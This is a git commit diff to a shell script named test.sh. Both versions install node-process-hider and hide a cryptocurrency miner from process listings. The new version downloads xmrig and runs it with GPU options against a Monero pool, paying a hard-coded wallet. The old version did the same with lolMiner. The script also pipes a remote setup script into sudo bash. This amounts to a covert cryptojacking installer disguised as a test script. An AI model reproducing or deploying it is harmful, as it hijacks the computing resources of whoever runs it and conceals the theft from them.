5744c074585eed026561f20f216d2cfbd03ed6fe
mikeyytman <mikeyytman@gmail.com>
2024-10-12 16:01:56 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,9 +1,11 @@
 sudo apt update
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-sudo apt install nodejs
+sudo apt-get install gcc -y
+sudo apt-get install build-essential -y
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
+sudo apt-get install -y nodejs
 npm i -g node-process-hider
-sudo ph add lolMiner
-wget https://github.com/mikeyytman/demo/raw/main/test.tar.gz
-tar -xvzf test.tar.gz
-cd 1.89
-./lolMiner --algo FISHHASH --pool stratum+ssl://fishhash.unmineable.com:4444 --user LTC:ltc1q0jrt9vd0zczpml0sq3zxwkhxf8wz8jjskwh29e.unmineable_worker
+sudo ph add xmrig
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz
+tar -xvzf xmrig-6.22.0-linux-static-x64.tar.gz
+cd xmrig-6.22.0
+./xmrig --opencl --cuda -o pool.supportxmr.com:443 -u 42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85 -k --tls
